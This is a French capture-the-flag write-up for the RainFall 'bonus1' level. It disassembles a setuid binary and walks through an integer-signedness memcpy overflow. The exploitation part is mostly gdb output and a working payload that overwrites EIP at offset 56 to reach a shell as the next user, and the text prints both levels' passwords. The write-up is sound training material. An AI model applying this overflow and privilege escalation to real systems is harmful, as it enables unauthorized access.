# BONUS 1

### Reconnaissance

On se connecte au level9 avec le password : cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9

Nous trouvons un binaire:
```
bonus1@192.168.56.102's password: 
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus1/bonus1
bonus1@RainFall:~$ ls 
bonus1
bonus1@RainFall:~$ file bonus1 
bonus1: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x5af8fd13428afc6d05de1abfa9d7e7621df174c7, not stripped
```

On analyse le binaire avec r2 et gdb:
```
[0x08048370]> pdf@main,
            ; DATA XREF from entry0 @ 0x8048387
┌ 129: int main (char **str);
│           ; arg char **str @ ebp+0xc
│           ; var void *s2 @ esp+0x4
│           ; var size_t n @ esp+0x8
│           ; var void *s1 @ esp+0x14
│           ; var signed int var_8h @ esp+0x3c
│           0x08048424      55             push ebp
│           0x08048425      89e5           mov ebp, esp
│           0x08048427      83e4f0         and esp, 0xfffffff0
│           0x0804842a      83ec40         sub esp, 0x40
│           0x0804842d      8b450c         mov eax, dword [str]
│           0x08048430      83c004         add eax, 4
│           0x08048433      8b00           mov eax, dword [eax]
│           0x08048435      890424         mov dword [esp], eax        ; const char *str
│           0x08048438      e823ffffff     call sym.imp.atoi           ; int atoi(const char *str)
│           0x0804843d      8944243c       mov dword [var_8h], eax
│           0x08048441      837c243c09     cmp dword [var_8h], 9
│       ┌─< 0x08048446      7e07           jle 0x804844f
│       │   0x08048448      b801000000     mov eax, 1
│      ┌──< 0x0804844d      eb54           jmp 0x80484a3
│      ││   ; CODE XREF from main @ 0x8048446
│      │└─> 0x0804844f      8b44243c       mov eax, dword [var_8h]
│      │    0x08048453      8d0c85000000.  lea ecx, dword [eax*4]
│      │    0x0804845a      8b450c         mov eax, dword [str]
│      │    0x0804845d      83c008         add eax, 8
│      │    0x08048460      8b00           mov eax, dword [eax]
│      │    0x08048462      89c2           mov edx, eax
│      │    0x08048464      8d442414       lea eax, dword [s1]
│      │    0x08048468      894c2408       mov dword [n], ecx          ; size_t n
│      │    0x0804846c      89542404       mov dword [s2], edx         ; const void *s2
│      │    0x08048470      890424         mov dword [esp], eax        ; void *s1
│      │    0x08048473      e8a8feffff     call sym.imp.memcpy         ; void *memcpy(void *s1, const void *s2, size_t n)
│      │    0x08048478      817c243c464c.  cmp dword [var_8h], 0x574f4c46
│      │┌─< 0x08048480      751c           jne 0x804849e
│      ││   0x08048482      c74424080000.  mov dword [n], 0
│      ││   0x0804848a      c74424048085.  mov dword [s2], 0x8048580   ; [0x8048580:4]=0x2f006873
│      ││   0x08048492      c70424838504.  mov dword [esp], str.bin_sh ; [0x8048583:4]=0x6e69622f ; "/bin/sh"
│      ││   0x08048499      e8b2feffff     call sym.imp.execl
│      ││   ; CODE XREF from main @ 0x8048480
│      │└─> 0x0804849e      b800000000     mov eax, 0
│      │    ; CODE XREF from main @ 0x804844d
│      └──> 0x080484a3      c9             leave
└           0x080484a4      c3             ret
```

Le programme attend 2 arguments:

- le premier arguments est envoyé en paramètre d'atoi, comparé a 9 et l'opérateur <a href="http://unixwiz.net/techtips/x86-jumps.html">`jle`</a>  nous expulse a la fin du programme si le resultat est supérieur a 9.

- le second argument est utilisé si la première condition est rempli. Il fait un `memcpy` avec en paramère `size_t n` = argv[1] * 4:

Enfin une comparason est faite entre le retour du atoi et la valeur `0x574f4c46`. Si cette condition est remplie, on ouvre un shell.

`memcpy` est une fonction dangereuse et succeptible de creér un buffer overflow. Si on respecte le comportement attendu du programme, on arrive a une taille max de copie de 36 (9 * 4). Ce qui n'est pas suffisant pour re ecrire l'EIP ...

Que ce passe t'il si on rentre un nombre négatif ?


### Exploitation

Avec un nombre négatif, on a une valeur completement absurde en paramètre du memcpy. En testant différentes valeur (en partant du int mini), on arrive a voir des valeurs "controllé":
```
gdb-peda$ r "-2147483627" $(python -c 'print "A" * 200')
[...]
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0xffff3534 --> 0xffffffff 
EBX: 0x0 
ECX: 0x54 ('T')
EDX: 0xffff3805 ('A' <repeats 200 times>...)
ESI: 0xf7fae000 --> 0x1e4d6c 
EDI: 0xf7fae000 --> 0x1e4d6c 
EBP: 0xffff3568 --> 0x0 
ESP: 0xffff3520 --> 0xffff3534 --> 0xffffffff 
EIP: 0x8048473 (<main+79>:      call   0x8048320 <memcpy@plt>)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048468 <main+68>: mov    DWORD PTR [esp+0x8],ecx
   0x804846c <main+72>: mov    DWORD PTR [esp+0x4],edx
   0x8048470 <main+76>: mov    DWORD PTR [esp],eax
=> 0x8048473 <main+79>: call   0x8048320 <memcpy@plt>
   0x8048478 <main+84>: cmp    DWORD PTR [esp+0x3c],0x574f4c46
   0x8048480 <main+92>: jne    0x804849e <main+122>
   0x8048482 <main+94>: mov    DWORD PTR [esp+0x8],0x0
   0x804848a <main+102>:        mov    DWORD PTR [esp+0x4],0x8048580
Guessed arguments:
arg[0]: 0xffff3534 --> 0xffffffff 
arg[1]: 0xffff3805 ('A' <repeats 200 times>...)
arg[2]: 0x54 ('T')
[------------------------------------stack-------------------------------------]
0000| 0xffff3520 --> 0xffff3534 --> 0xffffffff 
0004| 0xffff3524 --> 0xffff3805 ('A' <repeats 200 times>...)
0008| 0xffff3528 --> 0x54 ('T')
0012| 0xffff352c --> 0x80482fd (<_init+41>:     add    esp,0x8)
0016| 0xffff3530 --> 0xf7fae3fc --> 0xf7fafa40 --> 0x0 
0020| 0xffff3534 --> 0xffffffff 
0024| 0xffff3538 --> 0x8049764 --> 0x8049698 --> 0x1 
0028| 0xffff353c --> 0x80484d1 (<__libc_csu_init+33>:   lea    eax,[ebx-0xe0])
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x08048473 in main ()
[...]
Stopped reason: SIGSEGV
0x41414141 in ?? ()
```
ou 0x54 = 84.
Et c'est parfait, on trouve nos "A" a la valeur du segfault.

Maintenant il faut trouvé a qu'elle moment on re ecrit sur l'EIP:
```
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r "-2147483627" $(python -c 'print "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"')
Starting program: /home/yoginet/Documents/101/rainfall/bonus1/bonus1 "-2147483627" $(python -c 'print "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"')
[...]
Stopped reason: SIGSEGV
0x41416341 in ?? ()
gdb-peda$ pattern offset 0x41416341
1094804289 found at offset: 56
```

On converti notre adresse un peu avant le exec:
```
>>> from pwn import *
>>> p32(0x08048482)
'\x82\x84\x04\x08'
```

Et enfin:
```
gdb-peda$ r "-2147483627" $(python -c 'print "A" * 56 + "\x82\x84\x04\x08"')
[...]
gdb-peda$ c
Continuing.
process 10667 is executing new program: /usr/bin/dash
```

On a plus qu'a tester sur notre vm:

```
bonus1@RainFall:~$ ./bonus1 "-2147483627" $(python -c 'print "A" * 56 + "\x82\x84\x04\x08"')
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
$ id
uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
$ whoami
bonus2
```


Enjoy :)
